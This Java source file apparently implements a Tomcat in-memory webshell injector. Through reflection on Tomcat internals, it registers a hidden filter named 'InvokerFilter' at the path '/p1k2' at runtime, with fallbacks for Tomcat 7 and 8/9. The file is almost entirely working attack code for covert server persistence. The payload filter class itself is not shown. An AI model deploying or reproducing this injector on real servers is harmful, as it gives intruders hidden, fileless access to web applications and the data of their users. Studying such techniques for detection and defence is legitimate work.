package com.sorry.bug.tomcat;


import com.sorry.bug.CustomFilter;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

/**
 * created by 0x22cb7139 on 2021/7/12
 */
public class Filter_basic implements Filter {

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        HttpServletResponse rsp = (HttpServletResponse) servletResponse;
        //获取ApplicationContext
        try{
            String filterName = "InvokerFilter";
            String urlPattern = "/p1k2";
            final ServletContext servletContext = req.getSession().getServletContext();
            Field appctx = servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            ApplicationContext applicationContext =(ApplicationContext) appctx.get(servletContext);
            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
            Field configs = standardContext.getClass().getDeclaredField("filterConfigs");
            configs.setAccessible(true);
            HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) configs.get(standardContext);
            if(map.get(filterName)==null){
                System.out.println("add filter");
                Class filterDefClass = null;
                try{
                    //tomcat7
                    filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                }catch (ClassNotFoundException e){
                    //tomcat8/9
                    filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                }
                Object filterDef = filterDefClass.newInstance();
                filterDef.getClass().getDeclaredMethod("setFilterName",new Class[]{String.class}).invoke(filterDef,new Object[]{filterName});
                Filter filter = new CustomFilter();
                filterDef.getClass().getDeclaredMethod("setFilterClass",new Class[]{String.class}).invoke(filterDef,new Object[]{filter.getClass().getName()});
                filterDef.getClass().getDeclaredMethod("setFilter",new Class[]{Filter.class}).invoke(filterDef,new Object[]{filter});
                standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext,new Object[]{filterDef});
                Class filterMapClass = null;
                try{
                    //tomcat7
                    filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                }catch (ClassNotFoundException e){
                    //tomcat8/9
                    filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                }
                Object filterMap = filterMapClass.newInstance();
                filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, new Object[]{filterName});
                filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, new Object[]{DispatcherType.REQUEST.name()});
                filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, new Object[]{urlPattern});
                standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, new Object[]{filterMap});

                //设置 FilterConfig
                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(new Class[]{Context.class, filterDefClass});
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(new Object[]{standardContext, filterDef});
                map.put(filterName, filterConfig);
                System.out.println("Inject Success");
            }else{
                System.out.println("Injected");
            }


        }catch (Exception e){
            e.printStackTrace();
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {

    }
}
